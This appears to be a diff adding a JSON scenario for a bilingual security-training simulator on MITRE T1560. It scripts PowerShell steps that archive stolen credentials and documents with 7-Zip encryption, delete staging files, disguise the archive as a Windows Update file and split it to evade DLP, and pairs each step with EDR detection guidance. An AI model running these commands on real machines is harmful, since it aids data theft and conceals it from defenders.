@@ -1,0 +1,146 @@
+{
+  "id": "T1560",
+  "title": "수집 데이터 아카이브 시뮬레이션",
+  "titleEn": "Archive Collected Data Simulation",
+  "duration": 7,
+  "phases": [
+    { "label": "수집", "labelEn": "Collect" },
+    { "label": "압축", "labelEn": "Compress" },
+    { "label": "준비", "labelEn": "Stage" },
+    { "label": "완료", "labelEn": "Complete" }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "type": "attacker" },
+    { "id": "target", "label": "Compromised PC", "type": "victim" },
+    { "id": "staging", "label": "Temp Folder", "type": "server" },
+    { "id": "edr", "label": "EDR Agent", "type": "defense" }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "target", "label": "Remote Access", "activeStep": 0 },
+    { "from": "target", "to": "staging", "label": "Archive", "activeStep": 1 },
+    { "from": "staging", "to": "attacker", "label": "Exfil Ready", "activeStep": 3 },
+    { "from": "edr", "to": "target", "label": "Process Monitor", "activeStep": 2 }
+  ],
+  "desktopIcons": [
+    { "label": "7-Zip", "icon": "🗜️" },
+    { "label": "PowerShell", "icon": "💻" },
+    { "label": "File Manager", "icon": "📂" }
+  ],
+  "steps": [
+    {
+      "cmd": "powershell -ep bypass -c \"\n# 스테이징 폴더 확인\n$stage = 'C:\\Windows\\Temp\\collect_20260301';\nGet-ChildItem $stage | Format-Table Name, @{N='MB';E={[math]::Round($_.Length/1MB,2)}} -AutoSize;\n$total = (Get-ChildItem $stage | Measure-Object -Property Length -Sum).Sum;\nWrite-Host \\\"\\nTotal: $([math]::Round($total/1MB,2)) MB\\\"\"",
+      "out": "Name                          MB\n----                          --\n2026_전략보고서.xlsx           2.40\n고객_DB_백업.xlsx              1.80\nVPN_인증서.pfx                 0.12\nSSH_private.key                0.003\npassword_vault.kdbx            0.05\nchrome_logins.db               0.09\nff_logins.json                 0.02\n\nTotal: 4.49 MB",
+      "def": "[EDR] Staging folder enumeration before archival",
+      "defAction": "Process: powershell.exe\nAction: Get-ChildItem on staging folder\nPath: C:\\Windows\\Temp\\collect_20260301\nFiles: 7 sensitive files\nTotal: 4.49 MB\nRisk: MEDIUM",
+      "desc": "유출 전 스테이징 폴더에 모인 민감 파일들의 크기와 목록을 확인합니다.",
+      "descEn": "Checks the size and list of sensitive files collected in the staging folder before archival.",
+      "stepTitle": "스테이징 폴더 확인",
+      "stepTitleEn": "Check Staging Folder",
+      "feynman": "도둑이 가방에 넣을 물건들을 펼쳐놓고 무엇을 가져갈지 최종 확인하는 것과 같습니다.",
+      "feynmanEn": "It's like a burglar laying out items to check what to pack into the getaway bag.",
+      "expert": "C:\\Windows\\Temp에 민감 파일이 모이는 패턴은 T1074 (Data Staged)에서 이어지는 전형적인 흐름입니다. EDR에서 Temp 폴더의 파일 생성/복사 이벤트를 모니터링하세요.",
+      "expertEn": "Sensitive files accumulating in C:\\Windows\\Temp is a typical flow from T1074 (Data Staged). Monitor file creation/copy events in Temp folders via EDR.",
+      "defTooltip": "임시 폴더에 여러 유형의 민감 파일(.xlsx, .pfx, .key, .kdbx)이 동시에 존재하면 스테이징 활동을 의심하세요.",
+      "defTooltipEn": "When multiple sensitive file types (.xlsx, .pfx, .key, .kdbx) coexist in temp folders, suspect staging activity.",
+      "hackerLog": {
+        "title": "스테이징 폴더 확인",
+        "lines": [
+          { "text": "7 files, 4.49 MB total", "desc": "유출 대상 파일 최종 확인" },
+          { "text": "Types: xlsx, pfx, key, kdbx, db, json", "desc": "문서, 인증서, 비밀번호 DB 포함" }
+        ]
+      },
+      "terms": [
+        { "term": "Data Staging", "desc": "유출 전 수집된 데이터를 한 곳에 모아두는 공격 단계" },
+        { "term": "Temp Folder", "desc": "임시 파일 저장 폴더 - 공격자가 스테이징에 자주 사용" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# 7-Zip으로 AES-256 암호화 압축\n& 'C:\\Program Files\\7-Zip\\7z.exe' a -t7z -mx=9 -mhe=on -p'Exf1ltr@t3!' 'C:\\Windows\\Temp\\sys_update_v2.7z' 'C:\\Windows\\Temp\\collect_20260301\\*';\nWrite-Host '\\n=== Archive Info ===';\n& 'C:\\Program Files\\7-Zip\\7z.exe' l 'C:\\Windows\\Temp\\sys_update_v2.7z' | Select-String 'Physical Size|Method'\"",
+      "out": "7-Zip 23.01 : Copyright (c) 1999-2023 Igor Pavlov\n\nScanning the drive:\n7 files, 4709376 bytes (4599 KiB)\n\nCreating archive: C:\\Windows\\Temp\\sys_update_v2.7z\n\nAdd new data to archive: 7 files, 4709376 bytes (4599 KiB)\n\nFiles read from disk: 7\nArchive size: 1245184 bytes (1216 KiB)\nEverything is Ok\n\n=== Archive Info ===\nPhysical Size = 1245184\nMethod = LZMA2:24 7zAES:19",
+      "def": "[EDR] Encrypted 7z archive created in temp directory",
+      "defAction": "Process: 7z.exe (spawned by powershell.exe)\nAction: Create encrypted archive\nFlags: -t7z -mx=9 -mhe=on -p***\nSource: C:\\Windows\\Temp\\collect_20260301\nOutput: C:\\Windows\\Temp\\sys_update_v2.7z (1.2 MB)\nEncryption: AES-256 + header encryption\nRisk: HIGH",
+      "desc": "7-Zip으로 AES-256 암호화 압축을 수행합니다. 헤더 암호화(-mhe)로 파일명까지 숨깁니다.",
+      "descEn": "Performs AES-256 encrypted compression with 7-Zip. Header encryption (-mhe) hides even filenames.",
+      "stepTitle": "암호화 압축",
+      "stepTitleEn": "Encrypted Archive",
+      "feynman": "훔친 물건을 자물쇠 달린 가방에 넣고, 가방 겉면의 라벨까지 지우는 것과 같습니다. 열어보지 않으면 안에 뭐가 있는지 알 수 없습니다.",
+      "feynmanEn": "It's like putting stolen items in a locked bag and removing the labels. Nobody can tell what's inside without opening it.",
+      "expert": "7z의 -mhe=on 옵션은 헤더 암호화로 파일명도 숨깁니다. EDR에서 7z.exe, rar.exe, WinRAR.exe의 커맨드라인에서 -p, -hp, -mhe 플래그를 탐지하세요. 특히 powershell.exe가 부모 프로세스인 경우 위험도가 높습니다.",
+      "expertEn": "7z's -mhe=on option encrypts headers to hide filenames. Detect -p, -hp, -mhe flags in 7z.exe, rar.exe, WinRAR.exe command lines via EDR. Risk is higher when powershell.exe is the parent process.",
+      "defTooltip": "EDR에서 압축 도구의 커맨드라인을 모니터링하여 암호화 플래그(-p, -mhe, -hp)를 탐지하세요. 임시 폴더에서의 아카이브 생성은 높은 위험입니다.",
+      "defTooltipEn": "Monitor archival tool command lines in EDR for encryption flags (-p, -mhe, -hp). Archive creation in temp folders is high risk.",
+      "hackerLog": {
+        "title": "암호화 압축 완료",
+        "lines": [
+          { "text": "sys_update_v2.7z (1.2 MB, AES-256)", "desc": "4.5MB → 1.2MB로 압축 + 암호화" },
+          { "text": "Method: LZMA2:24 7zAES:19", "desc": "최고 압축률 + AES 암호화 적용" }
+        ]
+      },
+      "terms": [
+        { "term": "AES-256", "desc": "256비트 키를 사용하는 대칭 암호화 알고리즘 - 군사급 보안 수준" },
+        { "term": "Header Encryption (-mhe)", "desc": "아카이브 내 파일명과 디렉토리 구조까지 암호화하는 옵션" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# 원본 스테이징 파일 삭제 및 흔적 제거\nRemove-Item -Path 'C:\\Windows\\Temp\\collect_20260301' -Recurse -Force;\nRemove-Item -Path 'C:\\Windows\\Temp\\chrome_logins.db' -Force -ErrorAction SilentlyContinue;\nRemove-Item -Path 'C:\\Windows\\Temp\\ff_logins.json' -Force -ErrorAction SilentlyContinue;\n\n# 아카이브를 정상 파일명으로 위장\nRename-Item 'C:\\Windows\\Temp\\sys_update_v2.7z' 'C:\\Windows\\Temp\\WindowsUpdate_KB5034441.cab';\n\nWrite-Host 'Staging files cleaned. Archive disguised as Windows Update.';\nGet-ChildItem 'C:\\Windows\\Temp\\WindowsUpdate_KB5034441.cab' | Format-List Name, Length, LastWriteTime\"",
+      "out": "Staging files cleaned. Archive disguised as Windows Update.\nName          : WindowsUpdate_KB5034441.cab\nLength        : 1245184\nLastWriteTime : 2026-03-01 14:33:45",
+      "def": "[EDR] Staging files deleted + archive renamed to mimic Windows Update",
+      "defAction": "Process: powershell.exe\nAction: Remove-Item (staging cleanup) + Rename-Item (disguise)\nDeleted: 7 files from collect_20260301\nRenamed: sys_update_v2.7z → WindowsUpdate_KB5034441.cab\nRisk: HIGH\nAction: File quarantined",
+      "desc": "원본 파일을 삭제하고 아카이브를 Windows Update 파일로 위장합니다. 포렌식 증거를 최소화하면서 탐지를 회피합니다.",
+      "descEn": "Deletes original files and disguises the archive as a Windows Update file. Minimizes forensic evidence while evading detection.",
+      "stepTitle": "흔적 제거 및 위장",
+      "stepTitleEn": "Cleanup & Disguise",
+      "feynman": "도둑이 흔적을 지우고, 훔친 물건이 든 가방에 '택배'라고 적어서 의심을 피하는 것과 같습니다.",
+      "feynmanEn": "It's like a burglar cleaning up traces and labeling the bag of stolen goods as 'delivery package' to avoid suspicion.",
+      "expert": "확장자 변경(.7z → .cab)은 기본적인 위장이지만 파일 매직 넘버(시그니처)로 실제 형식을 확인할 수 있습니다. EDR에서 Rename-Item/ren 명령으로 아카이브 확장자가 변경되는 패턴과, Remove-Item으로 스테이징 폴더가 삭제되는 패턴을 모니터링하세요.",
+      "expertEn": "Extension change (.7z → .cab) is basic disguise but the actual format can be verified via file magic numbers (signatures). Monitor Rename-Item/ren commands changing archive extensions and Remove-Item deleting staging folders via EDR.",
+      "defTooltip": "파일 확장자와 실제 매직 넘버가 불일치하는 파일을 EDR에서 탐지하세요. 예: .cab 확장자인데 7z 시그니처를 가진 파일.",
+      "defTooltipEn": "Detect files where extension doesn't match the actual magic number via EDR. Example: .cab extension with 7z signature.",
+      "hackerLog": {
+        "title": "흔적 제거 및 위장",
+        "lines": [
+          { "text": "Remove-Item collect_20260301 (7 files)", "desc": "원본 스테이징 파일 삭제" },
+          { "text": "→ WindowsUpdate_KB5034441.cab", "desc": "Windows Update로 위장 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "File Magic Number", "desc": "파일 시작 바이트에 기록된 파일 형식 식별자 (예: 7z = 37 7A BC AF)" },
+        { "term": "Anti-Forensics", "desc": "디지털 포렌식 분석을 방해하기 위한 증거 인멸 기법" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# 분할 압축 - DLP 파일 크기 제한 우회\n& 'C:\\Program Files\\7-Zip\\7z.exe' a -t7z -mx=9 -mhe=on -p'Exf1ltr@t3!' -v500k 'C:\\Windows\\Temp\\patch_data' 'C:\\Windows\\Temp\\WindowsUpdate_KB5034441.cab';\nWrite-Host '\\n=== Split Archive Parts ===';\nGet-ChildItem 'C:\\Windows\\Temp\\patch_data.*' | Format-Table Name, @{N='KB';E={[math]::Round($_.Length/1KB,1)}} -AutoSize\"",
+      "out": "Creating archive: C:\\Windows\\Temp\\patch_data.7z.001\nCompressing: WindowsUpdate_KB5034441.cab\nEverything is Ok\n\n=== Split Archive Parts ===\nName                KB\n----                --\npatch_data.7z.001  500.0\npatch_data.7z.002  500.0\npatch_data.7z.003  216.0",
+      "def": "[EDR] Split archive creation - potential DLP evasion",
+      "defAction": "Process: 7z.exe (spawned by powershell.exe)\nAction: Split encrypted archive (-v500k)\nParts: 3 files (500KB + 500KB + 216KB)\nEncryption: AES-256\nRisk: HIGH",
+      "desc": "아카이브를 500KB 단위로 분할합니다. DLP의 파일 크기 기반 탐지를 우회하고, 조각별로 다른 채널을 통해 유출할 수 있습니다.",
+      "descEn": "Splits the archive into 500KB parts. Bypasses DLP's file-size-based detection and allows exfiltration through different channels per part.",
+      "stepTitle": "분할 압축",
+      "stepTitleEn": "Split Archive",
+      "feynman": "큰 짐을 여러 개의 작은 가방에 나눠 담아서, 한꺼번에 큰 짐을 들고 나가면 의심받으니 여러 번 나눠서 가져가는 것과 같습니다.",
+      "feynmanEn": "It's like splitting large luggage into several small bags. Instead of carrying one big suspicious bag, you take several small trips.",
+      "expert": "분할 압축(-v 옵션)은 DLP의 파일 크기 임계값을 우회합니다. 또한 각 조각을 DNS tunneling, 이메일, 클라우드 스토리지 등 다른 채널로 유출할 수 있습니다. NDR에서 동일 호스트에서 여러 소형 파일이 연속적으로 외부 전송되는 패턴을 탐지하세요.",
+      "expertEn": "Split archives (-v option) bypass DLP file size thresholds. Each part can be exfiltrated through different channels like DNS tunneling, email, or cloud storage. Detect patterns of multiple small files being sequentially transmitted from the same host via NDR.",
+      "defTooltip": "동일한 접두사를 가진 분할 파일(.001, .002, .003)이 임시 폴더에 생성되면 분할 압축 활동을 의심하세요.",
+      "defTooltipEn": "When split files with the same prefix (.001, .002, .003) appear in temp folders, suspect split archive activity.",
+      "hackerLog": {
+        "title": "분할 압축",
+        "lines": [
+          { "text": "patch_data.7z.001~003 (3 parts)", "desc": "500KB 단위로 분할 완료" },
+          { "text": "Total: 1,216 KB encrypted + split", "desc": "DLP 우회를 위한 이중 보호" }
+        ]
+      },
+      "terms": [
+        { "term": "Split Archive", "desc": "하나의 아카이브를 여러 개의 작은 파일로 분할하는 기법" },
+        { "term": "DLP (Data Loss Prevention)", "desc": "기업의 민감 데이터 유출을 탐지하고 차단하는 보안 솔루션" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "powershell.exe", "depth": 0, "alert": true, "minStep": 0 },
+    { "name": "Get-ChildItem (staging check)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "7z.exe a -t7z -mhe=on -p*** (encrypt)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "Remove-Item + Rename-Item (cleanup)", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "7z.exe a -v500k (split)", "depth": 1, "alert": true, "minStep": 3 }
+  ]
+}
